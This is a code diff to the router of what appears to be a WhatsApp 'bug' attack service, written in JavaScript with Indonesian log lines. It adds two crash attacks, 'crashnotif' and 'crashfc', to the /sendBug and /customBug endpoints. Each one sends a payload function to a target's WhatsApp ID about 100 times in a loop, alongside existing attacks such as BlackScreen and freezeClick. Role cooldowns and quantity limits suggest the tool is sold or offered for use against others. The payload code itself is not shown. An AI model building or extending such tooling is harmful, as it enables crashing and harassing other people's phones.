@@ -27,7 +27,7 @@ const {
   sleep,
   isVipOrOwner,
 
-  // BUG & ATTACK FUNCTIONS
+// BUG & ATTACK FUNCTIONS
   crashNotificationVVIP,
   uno,
   forceCloseMentalVVIP,
@@ -41,7 +41,8 @@ const {
   CallLog,
   BlackScreen,
   freezeClick,
-  DelayX
+  DelayX,
+  kresMamahMu
 } = require('../services/whatsappService');
 const { loadDatabase, saveDatabase } = require('../services/databaseService');
 const { ROLE_COOLDOWNS, MAX_QUANTITIES } = require('../utils/constants');
@@ -329,6 +330,12 @@ router.get("/sendBug", async (req, res) => {
       logger.info(`[📤 BUG] Menggunakan session untuk mengirim bug ke ${targetJid}`);
 
       switch (bug) {
+        case "crashnotif":
+          for (let i = 0; i < 100; i++) {
+            await crashNotificationVVIP(sock, targetJid);
+            await sleep(2000);
+          }
+          break;
         case "crashui":
           for (let i = 0; i < 100; i++) {
             await CrashUi(sock, targetJid);
@@ -346,6 +353,12 @@ router.get("/sendBug", async (req, res) => {
         case "freezeclick":
           for (let i = 0; i < 105; i++) {
             await freezeClick(sock, targetJid);
+            await sleep(2000);
+          }
+          break;
+        case "crashfc":
+          for (let i = 0; i < 100; i++) {
+            await kresMamahMu(sock, targetJid);
             await sleep(2000);
           }
           break;
@@ -597,6 +610,7 @@ router.get("/customBug", async (req, res) => {
       logger.info(`[📤 CUSTOM BUG] Starting attack on ${targetJid} using ${sessionName} (${senderType})`);
 
       const bugFunctions = {
+        'crashnotif': crashNotificationVVIP,
         'crashui': CrashUi,
         'delayx': DelayX,
         'blackscreen': BlackScreen,
@@ -605,7 +619,8 @@ router.get("/customBug", async (req, res) => {
         'pay': pay,
         'xvar': xvar,
         'calllog': CallLog,
-        'invisiblespam': invisibleSpam
+        'invisiblespam': invisibleSpam,
+        'crashfc': kresMamahMu
       };
 
       for (let i = 0; i < parsedQty; i++) {
